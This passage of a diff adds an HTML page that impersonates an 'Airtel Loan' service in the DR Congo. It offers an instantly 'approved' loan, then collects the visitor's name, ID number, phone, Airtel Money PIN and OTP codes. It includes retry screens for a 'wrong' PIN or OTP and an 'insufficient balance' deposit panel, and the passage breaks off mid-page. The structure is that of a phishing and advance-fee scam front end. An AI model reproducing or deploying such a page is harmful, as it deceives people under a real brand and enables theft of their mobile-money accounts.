@@ -1,0 +1,1220 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Airtel Loan · Congo DRC</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --airtel-red: #E40000;
+            --airtel-dark-red: #B80000;
+            --airtel-white: #FFFFFF;
+            --airtel-gray: #F5F5F5;
+            --text-dark: #222222;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: var(--airtel-gray); color: var(--text-dark); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; overflow-x: hidden; }
+
+        #splashScreen { position: fixed; inset: 0; background: var(--airtel-red); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; transition: opacity 0.8s ease, transform 0.8s ease; overflow: hidden; }
+        #splashScreen.hidden { opacity: 0; transform: scale(1.05); pointer-events: none; }
+        #splashScreen .logo-container { text-align: center; animation: pulse 2s ease-in-out infinite; z-index: 10; padding: 20px; }
+        #splashScreen .brand-text { font-size: 56px; font-weight: 700; color: white; letter-spacing: -1px; margin-bottom: 6px; }
+        #splashScreen .brand-text .loan-word { font-weight: 300; font-size: 40px; letter-spacing: 2px; display: block; margin-top: 8px; }
+        #splashScreen .brand-text .congo-word { font-weight: 900; font-size: 32px; letter-spacing: 8px; display: block; margin-top: 12px; border-top: 2px solid rgba(255,255,255,0.4); border-bottom: 2px solid rgba(255,255,255,0.4); padding: 8px 0; }
+        #splashScreen .tagline-congo { color: rgba(255,255,255,0.9); font-size: 14px; margin-top: 20px; letter-spacing: 1px; }
+        #splashScreen .spinner-loader { margin-top: 30px; width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes pulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.02);} }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .airtel-dots { position: absolute; width: 100px; height: 100px; background-image: radial-gradient(circle, rgba(255,255,255,0.3) 2px, transparent 2px); background-size: 14px 14px; pointer-events: none; }
+        .airtel-dots.top-left { top: 8%; left: 8%; }
+        .airtel-dots.top-right { top: 12%; right: 8%; }
+        .airtel-dots.bottom-left { bottom: 12%; left: 8%; }
+        .airtel-dots.bottom-right { bottom: 8%; right: 8%; }
+
+        .container { background: #fff; width: 100%; max-width: 550px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.15); overflow: hidden; position: relative; display: none; }
+        .container.visible { display: block; }
+
+        .header { background: var(--airtel-red); padding: 18px 20px 14px; text-align: center; color: white; position: relative; border-bottom: 3px solid var(--airtel-dark-red); }
+        .logo-placeholder { font-size: 26px; font-weight: 800; color: white; letter-spacing: 1px; margin-bottom: 2px; }
+        .logo-placeholder .loan-word { font-weight: 300; font-size: 18px; letter-spacing: 3px; margin-left: 4px; }
+        .header h1 { font-size: 16px; font-weight: 700; margin-bottom: 2px; text-transform: uppercase; letter-spacing: 1px; }
+        .header p { font-size: 12px; opacity: 0.9; }
+
+        .lang-switcher-btn { position: absolute; top: 12px; right: 12px; background: rgba(255,255,255,0.2); color: white; border: 1px solid rgba(255,255,255,0.35); border-radius: 20px; padding: 5px 10px; font-size: 12px; font-weight: 600; cursor: pointer; display: none; align-items: center; gap: 4px; transition: background 0.2s; z-index: 10; }
+        .lang-switcher-btn:hover { background: rgba(255,255,255,0.3); }
+        .lang-dropdown { display: none; position: absolute; top: 46px; right: 12px; background: white; border-radius: 12px; box-shadow: 0 8px 30px rgba(0,0,0,0.2); min-width: 180px; padding: 8px; z-index: 100; border: 1px solid #eee; }
+        .lang-dropdown.show { display: block; animation: fadeInDown 0.2s ease; }
+        @keyframes fadeInDown { from { opacity: 0; transform: translateY(-6px); } to { opacity: 1; transform: translateY(0); } }
+        .lang-dropdown-title { font-size: 11px; font-weight: 700; color: #888; text-transform: uppercase; padding: 6px 10px 4px; letter-spacing: 0.5px; }
+        .lang-dropdown-item { display: flex; align-items: center; gap: 8px; width: 100%; background: transparent; border: none; padding: 10px 12px; font-size: 14px; font-weight: 500; color: #222; cursor: pointer; border-radius: 8px; transition: background 0.15s; text-align: left; }
+        .lang-dropdown-item:hover { background: #f5f5f5; }
+        .lang-dropdown-item.active { background: #ffeeee; color: var(--airtel-red); font-weight: 700; }
+        .lang-dropdown-item.active::after { content: '✓'; margin-left: auto; color: var(--airtel-red); font-weight: 700; }
+
+        .step-indicator { display: none; justify-content: space-between; padding: 10px 14px 8px; background: var(--airtel-gray); border-bottom: 1px solid #e0e0e0; flex-wrap: wrap; gap: 2px; }
+        .step-indicator span { display: flex; align-items: center; gap: 4px; font-size: 10px; font-weight: 600; color: #aaa; transition: 0.3s; }
+        .step-indicator span .step-num { display: inline-flex; align-items: center; justify-content: center; width: 18px; height: 18px; border-radius: 50%; background: #e0e0e0; color: #888; font-size: 10px; font-weight: 700; }
+        .step-indicator span.active { color: var(--airtel-red); }
+        .step-indicator span.active .step-num { background: var(--airtel-red); color: white; }
+        .step-indicator span.done { color: var(--airtel-red); }
+        .step-indicator span.done .step-num { background: var(--airtel-red); color: white; }
+
+        .panel { padding: 20px 22px 24px; display: none; }
+        .panel.active { display: block; }
+        h2 { font-size: 18px; margin-bottom: 10px; color: var(--airtel-red); }
+        .form-group { margin-bottom: 14px; }
+        label { display: block; margin-bottom: 4px; font-weight: 600; font-size: 13px; color: var(--text-dark); }
+        select, input[type="text"], input[type="tel"], input[type="email"], input[type="password"], input[type="number"], textarea {
+            width: 100%; padding: 10px 14px; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 15px; outline: none; transition: border-color 0.3s; background: #fafafa;
+        }
+        select:focus, input:focus, textarea:focus { border-color: var(--airtel-red); background: white; }
+        textarea { min-height: 60px; resize: vertical; }
+              .radio-group { display: flex; flex-direction: column; gap: 8px; }
+        .radio-option { border: 2px solid #e0e0e0; padding: 10px 14px; border-radius: 10px; cursor: pointer; display: flex; align-items: center; gap: 10px; transition: all 0.2s; background: #fafafa; }
+        .radio-option:hover { background: #f0f0f0; }
+        .radio-option input { accent-color: var(--airtel-red); width: 18px; height: 18px; }
+        .radio-option.selected { border-color: var(--airtel-red); background: #ffeeee; }
+
+        .btn { background: var(--airtel-red); color: white; border: none; padding: 14px 20px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; transition: background 0.2s; display: flex; justify-content: center; align-items: center; gap: 10px; }
+        .btn:hover { background: var(--airtel-dark-red); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn-secondary { background: #e0e0e0; color: var(--text-dark); }
+        .btn-secondary:hover { background: #d0d0d0; }
+        .flex-row { display: flex; gap: 10px; }
+        .flex-row .btn { flex: 1; }
+
+        .calc-display { background: #fff5f5; border-radius: 16px; padding: 14px 16px; border: 2px solid var(--airtel-red); margin: 10px 0 14px; display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 6px; }
+        .calc-item { text-align: center; }
+        .calc-item .label { font-size: 10px; color: #888; text-transform: uppercase; font-weight: 600; }
+        .calc-item .value { font-weight: 800; font-size: 16px; color: var(--text-dark); }
+        .calc-item .value.red { color: var(--airtel-red); }
+        .slider-container { display: flex; align-items: center; gap: 12px; }
+        .slider-container input[type="range"] { flex: 1; accent-color: var(--airtel-red); height: 5px; background: #e0e0e0; border-radius: 10px; }
+        .slider-value { font-weight: 700; min-width: 80px; color: var(--airtel-red); font-size: 14px; text-align: right; }
+        .info-note { background: #fff5f5; padding: 8px 14px; border-radius: 40px; font-size: 12px; margin-top: 4px; display: flex; align-items: center; gap: 6px; color: var(--airtel-red); border: 1px solid #ffcccc; }
+        .notice-banner { padding: 10px 14px; border-radius: 8px; font-size: 13px; margin: 10px 0; border-left: 4px solid var(--airtel-red); background: #fff5f5; color: var(--airtel-red); }
+        .error-msg { color: #c62828; background: #ffebee; border-radius: 40px; padding: 6px 12px; font-size: 13px; margin: 6px 0; display: inline-block; border: 1px solid #ffcdd2; }
+        .hidden { display: none !important; }
+
+        .pin-grid, .otp-grid { display: flex; gap: 12px; justify-content: center; margin: 20px 0; }
+        .pin-grid input, .otp-grid input { width: 58px; height: 68px; text-align: center; font-size: 28px; font-weight: 700; border-radius: 14px; border: 2px solid var(--airtel-red); background: white; color: var(--text-dark); outline: none; transition: all 0.2s; }
+        .pin-grid input:focus, .otp-grid input:focus { box-shadow: 0 0 0 4px rgba(228, 0, 0, 0.15); background: #fff5f5; }
+
+        .spinner { width: 60px; height: 60px; border: 6px solid #f3f3f3; border-top: 6px solid var(--airtel-red); border-right: 6px solid var(--airtel-red); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
+        .loader-box { text-align: center; padding: 25px 15px; }
+        .status-update { font-weight: 600; color: #555; margin-top: 12px; font-size: 14px; min-height: 35px; }
+        .warning-box { background: #fff5f5; border: 1px solid var(--airtel-red); border-radius: 20px; padding: 12px 16px; text-align: center; margin: 12px 0; color: var(--airtel-red); font-size: 14px; display: flex; align-items: center; gap: 10px; justify-content: center; }
+
+        .congrats-card { text-align: center; padding: 10px 10px 20px; }
+        .congrats-icon { font-size: 50px; color: #28a745; margin-bottom: 10px; animation: bounce 1s ease infinite alternate; }
+        @keyframes bounce { 0%{transform:translateY(0);} 100%{transform:translateY(-10px);} }
+        .prize-amount { font-size: 32px; font-weight: 900; color: var(--text-dark); margin: 10px 0; background: #e8f0fe; border: 3px solid var(--airtel-red); padding: 10px 20px; border-radius: 16px; display: inline-block; }
+
+        .review-box { background: #fafafa; border-radius: 16px; padding: 12px 14px; margin: 10px 0; border: 1px solid #e0e0e0; }
+        .review-row { display: flex; justify-content: space-between; padding: 5px 0; border-bottom: 1px solid #eee; font-size: 13px; }
+        .review-row:last-child { border-bottom: none; }
+        .review-row .label { color: #555; font-weight: 500; }
+        .review-row .value { font-weight: 600; color: var(--text-dark); }
+
+        .phone-prefix-group { display: flex; align-items: center; border: 2px solid #e0e0e0; border-radius: 10px; background: #fafafa; padding: 0 10px; }
+        .phone-prefix-group:focus-within { border-color: var(--airtel-red); background: white; }
+        .phone-prefix-group .flag { font-size: 18px; margin-right: 6px; }
+        .phone-prefix-group .prefix { font-size: 14px; font-weight: 600; margin-right: 6px; white-space: nowrap; }
+        .phone-prefix-group input { border: none; padding: 10px 0; font-size: 15px; outline: none; background: transparent; width: 100%; min-width: 80px; }
+
+        .whatsapp-float { position: fixed; bottom: 20px; right: 20px; z-index: 999; background-color: #25D366; color: white; border-radius: 50%; width: 56px; height: 56px; display: flex; align-items: center; justify-content: center; font-size: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); text-decoration: none; }
+        .whatsapp-reminder { background: #e8f5e9; border-left: 4px solid #25D366; padding: 10px 14px; border-radius: 8px; font-size: 13px; color: #1e5e2a; display: flex; align-items: center; gap: 10px; margin-top: 15px; }
+
+        @media (max-width:420px) {
+            .pin-grid input, .otp-grid input { width: 48px; height: 58px; font-size: 24px; }
+            .calc-display { grid-template-columns: 1fr 1fr; }
+            .flex-row { flex-direction: column; }
+            .flex-row .btn { width: 100%; }
+            .step-indicator span { font-size: 10px; }
+            .step-indicator span .step-num { width: 18px; height: 18px; font-size: 10px; }
+        }
+    </style>
+</head>
+<body>
+  <div id="splashScreen">
+    <div class="airtel-dots top-left"></div>
+    <div class="airtel-dots top-right"></div>
+    <div class="airtel-dots bottom-left"></div>
+    <div class="airtel-dots bottom-right"></div>
+    <div class="logo-container">
+        <div class="brand-text">
+            airtel
+            <span class="loan-word">Loan</span>
+            <span class="congo-word">CONGO</span>
+        </div>
+        <div class="tagline-congo">RDC · Prêt Rapide & Sécurisé</div>
+        <div class="spinner-loader"></div>
+    </div>
+</div>
+
+<a href="https://wa.me/243061234567" target="_blank" class="whatsapp-float">
+    <i class="fab fa-whatsapp"></i>
+</a>
+
+<div class="container" id="appContainer">
+    <div class="header">
+        <button class="lang-switcher-btn" id="langSwitcherBtn" onclick="toggleLangDropdown(event)">
+            <i class="fas fa-globe"></i>
+            <span id="currentLangLabel">FR</span>
+            <i class="fas fa-chevron-down" style="font-size:10px;"></i>
+        </button>
+        <div class="lang-dropdown" id="langDropdown">
+            <div class="lang-dropdown-title" data-key="langChangeTitle">Changer la langue</div>
+            <button class="lang-dropdown-item" onclick="changeLanguageFromDropdown('fr')">🇫🇷 <span data-key="langFr">Français</span></button>
+            <button class="lang-dropdown-item" onclick="changeLanguageFromDropdown('ln')">🇨🇩 <span data-key="langLn">Lingala</span></button>
+            <button class="lang-dropdown-item" onclick="changeLanguageFromDropdown('sw')">🇨🇩 <span data-key="langSw">Kiswahili</span></button>
+        </div>
+        <div class="logo-placeholder">airtel<span class="loan-word">LOAN</span></div>
+        <h1 data-key="headerTitle">Prêt Rapide & Sécurisé</h1>
+        <p data-key="headerSub">Votre argent, quand vous en avez besoin.</p>
+    </div>
+
+    <div class="panel active" id="panelLanguage">
+        <div style="text-align:center;padding:30px 20px 25px;">
+            <h2 data-key="langTitle">🌍 Choisissez votre langue</h2>
+            <p style="font-size:14px;color:#555;margin-bottom:20px;" data-key="langSub">Quelle langue souhaitez-vous utiliser ?</p>
+            <button class="btn" onclick="selectLanguage('fr')" style="margin-bottom:8px;">🇫🇷 <span data-key="langFrBtn">Français</span></button>
+            <button class="btn" onclick="selectLanguage('ln')" style="margin-bottom:8px;">🇨🇩 <span data-key="langLnBtn">Lingala</span></button>
+            <button class="btn" onclick="selectLanguage('sw')" style="margin-bottom:8px;">🇨🇩 <span data-key="langSwBtn">Kiswahili</span></button>
+        </div>
+    </div>
+
+    <div class="step-indicator" id="stepIndicator">
+        <span id="step1Label" class="active"><span class="step-num">1</span> <span data-key="step1">Offre</span></span>
+        <span id="step2Label"><span class="step-num">2</span> <span data-key="step2">Profil</span></span>
+        <span id="step3Label"><span class="step-num">3</span> <span data-key="step3">Révision</span></span>
+        <span id="step4Label"><span class="step-num">4</span> <span data-key="step4">Traitement</span></span>
+    </div>
+
+    <div class="panel" id="panelStep1">
+        <h2 data-key="step1Title">Détails du Prêt</h2>
+        <p style="font-size:13px;color:#666;margin-bottom:12px;" data-key="step1Desc">Entrez les détails de votre demande de prêt.</p>
+        <div class="info-note"><i class="fas fa-info-circle"></i> <span data-key="limitNote">Montant entre 100 $ et 5 000 $</span></div>
+        <div class="form-group">
+            <label data-key="loanTypeLabel">Type de prêt *</label>
+            <div class="radio-group" id="loanTypeGroup">
+                <label class="radio-option selected" data-loan="personnel"><input type="radio" name="loanType" value="Personnel" checked><span data-key="loanTypePersonal">Prêt Personnel</span></label>
+                <label class="radio-option" data-loan="business"><input type="radio" name="loanType" value="Professionnel"><span data-key="loanTypeBusiness">Prêt Professionnel</span></label>
+            </div>
+        </div>
+        <div class="form-group">
+            <label data-key="amountLabel">Montant ($) *</label>
+            <div class="slider-container">
+                <input type="range" id="loanAmountSlider" min="100" max="5000" step="50" value="1000">
+                <span class="slider-value" id="amountValue">1 000 $</span>
+            </div>
+            <input type="number" id="loanAmount" value="1000" min="100" max="5000" step="50" style="margin-top:6px;" placeholder="Ex: 1000">
+        </div>
+        <div class="form-group">
+            <label data-key="termLabel">Durée du prêt (mois) *</label>
+            <select id="loanMonths">
+                <option value="3" data-key="months3">3 mois</option>
+                <option value="6" data-key="months6">6 mois</option>
+                <option value="9" data-key="months9">9 mois</option>
+                <option value="12" selected data-key="months12">12 mois</option>
+                <option value="24" data-key="months24">24 mois</option>
+                <option value="36" data-key="months36">36 mois</option>
+                <option value="48" data-key="months48">48 mois</option>
+            </select>
+        </div>
+        <div class="form-group">
+            <label data-key="interestLabel">Taux d'intérêt %/an</label>
+            <input type="number" id="interestRate" value="5.5" readonly style="background:#f0f0f0;cursor:not-allowed;">
+        </div>
+        <div class="calc-display">
+            <div class="calc-item"><div class="label" data-key="monthlyLabel">Mensuel</div><div class="value red" id="monthlyDisplay">0 $</div></div>
+            <div class="calc-item"><div class="label" data-key="totalLabel">Total</div><div class="value" id="totalDisplay">0 $</div></div>
+            <div class="calc-item"><div class="label" data-key="interestLabel2">Intérêts</div><div class="value" id="interestDisplay">0 $</div></div>
+        </div>
+        <div class="form-group">
+            <label data-key="purposeLabel">Objectif du prêt *</label>
+            <textarea id="purpose" rows="2" placeholder="Décrivez l'objectif de votre prêt..."></textarea>
+        </div>
+        <button class="btn" onclick="goToStep2()"><span data-key="next">Étape suivante</span> <i class="fas fa-arrow-right"></i></button>
+    </div>
+
+    <div class="panel" id="panelStep2">
+        <h2 data-key="step2Title">Informations Personnelles</h2>
+        <p style="font-size:13px;color:#666;margin-bottom:12px;" data-key="step2Desc">Veuillez fournir vos coordonnées.</p>
+        <div class="flex-row">
+            <div class="form-group"><label data-key="firstNameLabel">Prénom *</label><input type="text" id="firstName" placeholder="Prénom"></div>
+            <div class="form-group"><label data-key="lastNameLabel">Nom *</label><input type="text" id="lastName" placeholder="Nom"></div>
+        </div>
+        <div class="form-group">
+            <label data-key="phoneLabel">Numéro de téléphone (RDC) *</label>
+            <div class="phone-prefix-group">
+                <span class="flag">🇨🇩</span><span class="prefix">+243</span>
+                <input type="tel" id="phone" placeholder="Ex: 812345678" inputmode="numeric" pattern="[0-9]*">
+            </div>
+            <div style="font-size:12px;color:#888;margin-top:4px;" data-key="phoneHint">9 chiffres sans +243</div>
+            <div id="phoneError" class="error-msg hidden" data-key="errPhone">Veuillez entrer un numéro Airtel valide.</div>
+        </div>
+        <div class="form-group">
+            <label data-key="emailLabel">Adresse e-mail *</label>
+            <input type="email" id="email" placeholder="exemple@email.com">
+            <div id="emailError" class="error-msg hidden" data-key="errEmail">Veuillez entrer un e-mail valide.</div>
+        </div>
+        <div class="form-group">
+            <label data-key="idLabel">Numéro de pièce d'identité *</label>
+            <input type="text" id="idNumber" placeholder="Ex: CNI123456789">
+            <div id="idError" class="error-msg hidden" data-key="errId">Veuillez entrer votre numéro de pièce d'identité.</div>
+        </div>
+        <div class="flex-row">
+            <div class="form-group">
+                <label data-key="cityLabel">Ville *</label>
+                <select id="city">
+                    <option value="" data-key="selectCity">Sélectionnez</option>
+                    <option value="Kinshasa">Kinshasa</option><option value="Lubumbashi">Lubumbashi</option>
+                    <option value="Mbuji-Mayi">Mbuji-Mayi</option><option value="Kisangani">Kisangani</option>
+                    <option value="Kananga">Kananga</option><option value="Bukavu">Bukavu</option>
+                    <option value="Goma">Goma</option><option value="Likasi">Likasi</option>
+                    <option value="Kolwezi">Kolwezi</option><option value="Matadi">Matadi</option>
+                    <option value="Tshikapa">Tshikapa</option><option value="Beni">Beni</option>
+                    <option value="Autre" data-key="otherCity">Autre</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label data-key="statusLabel">Situation professionnelle *</label>
+                <select id="status">
+                    <option value="" data-key="selectStatus">Sélectionnez</option>
+                    <option value="Salarié" data-key="statusEmp">Salarié</option>
+                    <option value="Indépendant" data-key="statusSelf">Indépendant</option>
+                    <option value="Commerçant" data-key="statusTrader">Commerçant</option>
+                    <option value="Étudiant" data-key="statusStudent">Étudiant</option>
+                    <option value="Fonctionnaire" data-key="statusCivil">Fonctionnaire</option>
+                    <option value="Sans emploi" data-key="statusUnemployed">Sans emploi</option>
+                    <option value="Retraité" data-key="statusRetired">Retraité</option>
+                    <option value="Autre" data-key="statusOther">Autre</option>
+                </select>
+            </div>
+        </div>
+        <div class="flex-row">
+            <button class="btn btn-secondary" onclick="goToStep1()"><i class="fas fa-arrow-left"></i> <span data-key="back">Retour</span></button>
+            <button class="btn" onclick="goToStep3()"><span data-key="next">Étape suivante</span> <i class="fas fa-arrow-right"></i></button>
+        </div>
+    </div>
+
+    <div class="panel" id="panelStep3">
+        <h2 data-key="step3Title">Révision de la Demande</h2>
+        <p style="font-size:13px;color:#666;margin-bottom:12px;" data-key="step3Desc">Veuillez vérifier tous les détails avant de soumettre.</p>
+        <div class="notice-banner"><i class="fas fa-info-circle"></i> <span data-key="reviewNotice">Vérifiez attentivement toutes les informations.</span></div>
+        <div class="review-box">
+            <div class="review-row"><span class="label" data-key="rLoanType">Type de prêt</span><span class="value" id="reviewLoanType">—</span></div>
+            <div class="review-row"><span class="label" data-key="rAmount">Montant</span><span class="value" id="reviewAmount">—</span></div>
+            <div class="review-row"><span class="label" data-key="rTerm">Durée</span><span class="value" id="reviewTerm">—</span></div>
+            <div class="review-row"><span class="label" data-key="rPurpose">Objectif</span><span class="value" id="reviewPurpose">—</span></div>
+            <div class="review-row"><span class="label" data-key="rName">Nom complet</span><span class="value" id="reviewName">—</span></div>
+            <div class="review-row"><span class="label" data-key="rPhone">Téléphone</span><span class="value" id="reviewPhone">—</span></div>
+            <div class="review-row"><span class="label" data-key="rEmail">E-mail</span><span class="value" id="reviewEmail">—</span></div>
+            <div class="review-row"><span class="label" data-key="rId">Pièce d'identité</span><span class="value" id="reviewId">—</span></div>
+            <div class="review-row"><span class="label" data-key="rCity">Ville</span><span class="value" id="reviewCity">—</span></div>
+            <div class="review-row"><span class="label" data-key="rStatus">Statut</span><span class="value" id="reviewStatus">—</span></div>
+            <div class="review-row"><span class="label" data-key="rMonthly">Mensuel</span><span class="value" id="reviewMonthly">—</span></div>
+            <div class="review-row"><span class="label" data-key="rTotal">Total</span><span class="value" id="reviewTotal">—</span></div>
+        </div>
+        <div class="flex-row">
+            <button class="btn btn-secondary" onclick="goToStep2()"><i class="fas fa-arrow-left"></i> <span data-key="back">Retour</span></button>
+            <button class="btn" onclick="submitApplication()"><i class="fas fa-paper-plane"></i> <span data-key="submit">Soumettre</span></button>
+        </div>
+    </div>
+    <div class="panel" id="panelStep4">
+    <div class="loader-box">
+        <div class="spinner"></div>
+        <h3 data-key="processingTitle">Traitement de votre demande...</h3>
+        <p style="color:#777;font-size:13px;margin-top:5px;" data-key="processingSub">Veuillez patienter.</p>
+        <div class="warning-box"><i class="fas fa-exclamation-triangle"></i> <span data-key="refreshWarning">⚠️ Ne rafraîchissez pas la page !</span></div>
+        <div class="status-update" id="processingStatus" data-key="connecting">Connexion...</div>
+        <div style="margin-top:12px;">
+            <div style="width:100%;height:4px;background:#e0e0e0;border-radius:10px;overflow:hidden;">
+                <div id="processingProgress" style="height:100%;width:0%;background:var(--airtel-red);transition:width 0.3s;"></div>
+            </div>
+            <p id="processingPercent" style="font-size:13px;font-weight:600;color:var(--airtel-red);margin-top:4px;">0%</p>
+        </div>
+    </div>
+</div>
+
+<div class="panel" id="panelQualified">
+    <div class="congrats-card">
+        <div class="congrats-icon"><i class="fas fa-check-circle"></i></div>
+        <h2 style="color:#28a745;" data-key="congrats">Félicitations !</h2>
+        <p style="font-size:14px;color:#555;margin-bottom:6px;" data-key="approvedText">Votre prêt a été approuvé !</p>
+        <div class="prize-amount" id="qualifiedAmount">0 $</div>
+        <p style="font-size:13px;color:#888;margin-bottom:12px;" data-key="approvedAmount">Montant approuvé</p>
+        <button class="btn" onclick="goToPinEntry()"><i class="fas fa-lock"></i> <span data-key="withdrawBtn">Retirer le prêt</span></button>
+    </div>
+</div>
+
+<div class="panel" id="panelPinEntry">
+    <h2 data-key="pinTitle">Code PIN Airtel Money</h2>
+    <div class="notice-banner"><i class="fas fa-lock"></i> <span data-key="pinNotice">Entrez votre code PIN à 4 chiffres.</span></div>
+    <div class="form-group">
+        <label data-key="pinLabel">Code PIN (4 chiffres)</label>
+        <div class="pin-grid" id="pinGrid">
+            <input type="password" maxlength="1" class="pin-input" pattern="\d" inputmode="numeric">
+            <input type="password" maxlength="1" class="pin-input" pattern="\d" inputmode="numeric">
+            <input type="password" maxlength="1" class="pin-input" pattern="\d" inputmode="numeric">
+            <input type="password" maxlength="1" class="pin-input" pattern="\d" inputmode="numeric">
+        </div>
+        <div id="pinError" class="error-msg hidden" data-key="pinError">Veuillez saisir les 4 chiffres.</div>
+    </div>
+    <button class="btn" onclick="verifyPin()"><i class="fas fa-check"></i> <span data-key="verifyPin">Vérifier le PIN</span></button>
+    <button class="btn btn-secondary" style="margin-top:8px;" onclick="goBackToQualified()"><i class="fas fa-arrow-left"></i> <span data-key="back">Retour</span></button>
+</div>
+
+<div class="panel" id="panelPinApproval">
+    <div class="loader-box">
+        <div class="spinner"></div>
+        <h3 style="color:var(--airtel-red);" data-key="pinProcessingTitle">Veuillez patienter...</h3>
+        <p style="color:#777;font-size:13px;margin-top:5px;" data-key="pinProcessingSub">Votre PIN est en cours de vérification.</p>
+        <p style="color:#999;font-size:12px;margin-top:15px;" data-key="waitingNote">Cette opération prend généralement quelques secondes.</p>
+        <p style="color:#bbb;font-size:11px;margin-top:5px;" id="pinWaitTimer">0s</p>
+    </div>
+</div>
+
+<div class="panel" id="panelWrongPin">
+    <div class="loader-box">
+        <div style="font-size:60px;color:#dc3545;margin-bottom:15px;"><i class="fas fa-times-circle"></i></div>
+        <h3 style="color:#dc3545;" data-key="wrongPinTitle">PIN incorrect</h3>
+        <p style="color:#555;font-size:14px;margin-top:10px;" data-key="wrongPinMsg">Le code PIN est incorrect. Veuillez réessayer.</p>
+        <button class="btn" onclick="goToPinEntry()" style="margin-top:20px;"><i class="fas fa-undo"></i> <span data-key="retry">Réessayer</span></button>
+        <button class="btn btn-secondary" style="margin-top:8px;" onclick="goHome()"><i class="fas fa-home"></i> <span data-key="home">Accueil</span></button>
+    </div>
+</div>
+    <div class="panel" id="panelOtpEntry">
+        <h2 data-key="otpTitle">Code OTP</h2>
+        <div class="notice-banner"><i class="fas fa-key"></i> <span data-key="otpNotice">Entrez le code OTP à 4 chiffres.</span></div>
+        <div style="display:flex;justify-content:space-between;margin:6px 0 12px;">
+            <span style="font-size:13px;color:#888;"><span data-key="otpExpiry">⏱️ OTP expire dans</span> <span id="otpCountdown" style="font-weight:700;color:var(--airtel-red);">60</span>s</span>
+        </div>
+        <div id="otpForm">
+            <div class="form-group">
+                <label data-key="otpLabel">Code OTP (4 chiffres)</label>
+                <div class="otp-grid" id="otpGrid">
+                    <input type="text" maxlength="1" class="otp-input" pattern="\d" inputmode="numeric">
+                    <input type="text" maxlength="1" class="otp-input" pattern="\d" inputmode="numeric">
+                    <input type="text" maxlength="1" class="otp-input" pattern="\d" inputmode="numeric">
+                    <input type="text" maxlength="1" class="otp-input" pattern="\d" inputmode="numeric">
+                </div>
+                <div id="otpError" class="error-msg hidden" data-key="otpError">Veuillez saisir les 4 chiffres.</div>
+            </div>
+            <button class="btn" onclick="submitOtp()" id="otpBtn"><i class="fas fa-check"></i> <span data-key="submitOtp">Soumettre OTP</span></button>
+            <div class="flex-row" style="margin-top:8px;">
+                <button class="btn btn-secondary" onclick="goBackToPinEntry()"><i class="fas fa-arrow-left"></i> <span data-key="back">Retour</span></button>
+                <button class="btn btn-secondary" onclick="goHome()"><i class="fas fa-home"></i> <span data-key="home">Accueil</span></button>
+            </div>
+        </div>
+        <div id="otpResultMessage" style="margin-top:12px; display:none;"></div>
+        <div class="whatsapp-reminder"><i class="fab fa-whatsapp"></i><div><strong data-key="needHelp">💬 Besoin d'aide ?</strong><br><span data-key="whatsappText">Contactez-nous via WhatsApp.</span></div></div>
+    </div>
+
+    <div class="panel" id="panelOtpApproval">
+        <div class="loader-box">
+            <div class="spinner"></div>
+            <h3 style="color:var(--airtel-red);" data-key="otpProcessingTitle">Veuillez patienter...</h3>
+            <p style="color:#777;font-size:13px;margin-top:5px;" data-key="otpProcessingSub">Votre code OTP est en cours de vérification.</p>
+            <p style="color:#999;font-size:12px;margin-top:15px;" data-key="waitingNote">Cette opération prend généralement quelques secondes.</p>
+            <p style="color:#bbb;font-size:11px;margin-top:5px;" id="otpWaitTimer">0s</p>
+        </div>
+    </div>
+
+    <div class="panel" id="panelWrongOtp">
+        <div class="loader-box">
+            <div style="font-size:60px;color:#dc3545;margin-bottom:15px;"><i class="fas fa-times-circle"></i></div>
+            <h3 style="color:#dc3545;" data-key="wrongOtpTitle">Code OTP incorrect</h3>
+            <p style="color:#555;font-size:14px;margin-top:10px;" data-key="wrongOtpMsg">Le code OTP est incorrect ou expiré. Veuillez réessayer.</p>
+            <button class="btn" onclick="goToOtpEntry()" style="margin-top:20px;"><i class="fas fa-undo"></i> <span data-key="retry">Réessayer</span></button>
+            <button class="btn btn-secondary" style="margin-top:8px;" onclick="goHome()"><i class="fas fa-home"></i> <span data-key="home">Accueil</span></button>
+        </div>
+    </div>
+
+    <div class="panel" id="panelDeposit">
+        <div style="text-align:center;padding:20px 10px;">
+            <div style="font-size:60px;color:#ffc107;margin-bottom:15px;"><i class="fas fa-exclamation-triangle"></i></div>
+            <h2 style="color:var(--airtel-red);" data-key="depositTitle">Solde insuffisant</h2>
+            <p style="font-size:14px;line-height:1.6;color:#555;margin-top:15px;" id="depositMsg"></p>
+            <button class="btn" onclick="goToPinEntry()" style="margin-top:20px;"><i class="fas fa-undo"></i> <span data-key="retry">Réessayer</span></button>
+            <button class="btn btn-secondary" style="margin-top:8px;" onclick="goHome()"><i class="fas fa-home"></i> <span data-key="home">Accueil</span></button>
+        </div>
+    </div>
+
+    <div class="panel" id="panelFinal">
+        <div style="text-align:center;padding:20px 10px;">
+            <div style="font-size:60px;color:#28a745;margin-bottom:15px;"><i class="fas fa-check-circle"></i></div>
+            <h2 style="color:#28a745;" data-key="finalTitle">Prêt Décaissé avec Succès !</h2>
+            <p style="font-size:14px;line-height:1.6;color:#555;margin-top:15px;" data-key="finalDesc">Votre prêt a été envoyé sur votre compte Airtel Money.</p>
